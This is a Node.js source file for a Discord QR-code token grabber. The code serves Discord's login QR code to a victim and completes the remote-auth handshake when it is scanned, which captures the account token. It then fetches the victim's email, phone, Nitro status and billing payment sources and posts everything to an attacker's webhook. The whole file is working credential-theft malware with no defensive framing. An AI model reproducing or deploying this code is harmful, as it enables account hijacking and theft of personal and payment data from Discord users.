
const
    express = require("express"),
    crypto = require("crypto"),
    { StringDecoder } = require('string_decoder'),
    WebSocket = require('ws'),
    {
        sendWebhook,
        decryptPayload,
        findRealToken,
        nitro,
        badges,
        billing,
        zip,
        discord,
        sleep,
        hexColorToDiscordInt,
        generateQrCode,
        allBadges,
        emoji
    } = require("./utils.js")


class DiscordQrGrab {
    constructor(config) {
        const { api, webhook } = config;
        if ((api || webhook) && (!api || !webhook)) {
            console.log("=> ".cyan + `DiscordQrGrab `.bgCyan + ` Verifier le config !`.red);
            return;
        };
        this.config = config;
        this.app = express();
        this.domain = `${config?.api?.protocole}://${config?.api?.host}${config?.api?.port === 80 ? "" : `:${config?.api?.port}`}`;
        this.key = crypto.generateKeyPairSync("rsa", {
            modulusLength: 2048,
            publicKeyEncoding: {
                type: 'spki',
                format: 'pem'
            },
            privateKeyEncoding: {
                type: 'pkcs1',
                format: 'pem'
            }
        });
        this.app.get("/", (req, res) => res.redirect("https://github.com/zougataga"))
        this.app.get("/qrcode", (req, res) => res.sendFile("qrcode.png", { root: "./assets" }));
        this.app.listen(this.config?.api.port, () => {
            console.log("=> ".cyan + `Api listen on `.blue + `${this.domain}`.green);
            console.log(`---------------------------------------------------------`.cyan);
            this.#createQrCodeGrabber()
        });
    }

    #createQrCodeGrabber() {
        const
            self = this,
            ws = new WebSocket('wss://remote-auth-gateway.discord.gg/?v=2', { headers: { 'Origin': 'https://discord.com' } });
        ws.onopen = function () {
            console.log("=> ".cyan + "WebSocket Client Open".blue)
        };
        ws.onclose = function () {
            console.log("=> ".cyan + "WebSocket Client Close".red);
            self.heartbeat_interval = 0;
            self.last_heartbeat = 0;
            self.user = {};
            console.log(`---------------------------------------------------------`.cyan);
            self.#createQrCodeGrabber();
        };
        ws.onerror = function (error) { console.log("=> ".cyan + `WebSocket Client Error: ${error}`.red) };
        ws.onmessage = async function (message) {
            const data = JSON.parse(message.data);
            if (data.op == "hello") {
                this.heartbeat_interval = data.heartbeat_interval / 1000;
                this.last_heartbeat = Date.now() / 1000;
                heartbeatSender();
                const publickey = publicKey();
                sendWs("init", { 'encoded_public_key': publickey })
            } else if (data.op == "nonce_proof") {
                const
                    nonce = data.encrypted_nonce,
                    decrypted_nonce = decryptPayload(nonce, self.key),
                    proof = crypto.createHash('sha256')
                        .update(decrypted_nonce)
                        .digest('base64')
                        .replace(/\+/g, '-')
                        .replace(/\//g, '_')
                        .replace(/=+$/, '');
                sendWs("nonce_proof", { 'proof': proof });
            } else if (data.op == "pending_remote_init") generateQrCode(data.fingerprint, true);
            else if (data.op == "pending_ticket") {
                const
                    decryptedUser = decryptPayload(data?.encrypted_user_payload, self.key),
                    userData = decryptedUser.toString()?.split(':');
                this.user = {
                    id: userData[0],
                    discriminator: userData[1],
                    avatar: userData[2],
                    username: userData[3],
                    avatarUrl: userData[2] == 0 || !userData[2] ? "" : `https://cdn.discordapp.com/avatars/${userData[1]}/${userData[2]}.${userData[2].startsWith('a_') ? 'gif' : 'png'}`
                };
                if (this.user.id) {
                    const payload = {
                        embeds: [
                            {
                                "author": {
                                    "name": `${this.user.username}#${this.user.discriminator} (${this.user.id})`,
                                    "icon_url": "https://tenor.com/view/hacker-techno-gif-3552791"
                                },
                                "title": "QrCode Scanner en attente d'autorisation",
                                "thumbnail": {
                                    "url": this.user.avatarUrl
                                },
                                "description": `\`\`\`${JSON.stringify(this.user)}\`\`\``,
                                "color": hexColorToDiscordInt("#ffffff"),
                                "footer": {
                                    "text": " ✌ By https://github.com/zougataga"
                                }
                            }
                        ]
                    };
                    await sendWebhook(self.config.webhook, payload);
                };
            } else if (data.op == "pending_login") {
                const
                    ticket = data.ticket,
                    token = await findRealToken(ticket, self.key, self.config?.keyCaptcha, self.config.webhook);
                if (!token) return;
                const info = await discord("https://discord.com/api/v9/users/@me", token);
                if (!info || info?.code === 0) return;
                const
                    bill = await discord("https://discord.com/api/v9/users/@me/billing/payment-sources", token),
                    payload = {
                        embeds: [
                            {
                                "author": {
                                    "name": `${info.username}#${info.discriminator} (${info.id})`,
                                    "icon_url": "https://tenor.com/view/hacker-techno-gif-3552791"
                                },
                                "title": "QrCode Scanner et token recuper avec succès",
                                "thumbnail": {
                                    "url": `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=128`
                                },
                                "fields": [
                                    {
                                        "name": `${emoji.embed.token} Token;`,
                                        "value": `\`${token}\``
                                    },
                                    {
                                        "name": `${emoji.embed.badge} Badges:`,
                                        "value": await badges(info.flags),
                                        "inline": true
                                    },
                                    {
                                        "name": `${emoji.embed.nitro} Nitro Type:`,
                                        "value": await nitro(info, token),
                                        "inline": true
                                    },
                                    {
                                        "name": `${emoji.embed.billing} Billing:`,
                                        "value": await billing(bill),
                                        "inline": true
                                    },
                                    {
                                        "name": `${emoji.embed.email} Email:`,
                                        "value": `\`${info.email}\``,
                                        "inline": true
                                    },
                                    {
                                        "name": `${emoji.embed.mdp} Phone:`,
                                        "value": `\`${info.phone || "❌"}\``,
                                        "inline": true
                                    }
                                ],
                                "color": hexColorToDiscordInt("#ffffff"),
                                "footer": {
                                    "text": " ✌ By https://github.com/zougataga"
                                }
                            }
                        ]
                    };
                await sendWebhook(self.config.webhook, payload);
                await zip(token, `${info.username}#${info.discriminator} (${info.id})`, info.id, self.config.webhook)
                console.log("=> ".cyan + `New grabbed: ${info.username}#${info.discriminator} (${info.id})`.green);
            } else if (data.op == "cancel") {
                console.log("=> ".cyan + `Qrcode Cancel `.red);
                // ws.close()
            }
        }

        function sendWs(op, data = null) {
            let payload = { 'op': op }
            if (data !== null) payload = { ...payload, ...data };
            ws.send(JSON.stringify(payload))
        }

        function publicKey() {
            const decoder = new StringDecoder('utf-8');
            let pub_key = self.key.publicKey;
            pub_key = decoder.write(pub_key);
            pub_key = (pub_key.split('\n').slice(1, -2)).join('');
            return pub_key
        }
        async function heartbeatSender() {
            while (ws.readyState === ws.OPEN) {
                await sleep(500);
                const
                    current_time = Date.now() / 1000,
                    time_passed = current_time - self.last_heartbeat + 1;
                if (time_passed >= self.heartbeat_interval) {
                    sendWs("heartbeat");
                    self.last_heartbeat = current_time
                }
            }
        }

    };


}
module.exports = DiscordQrGrab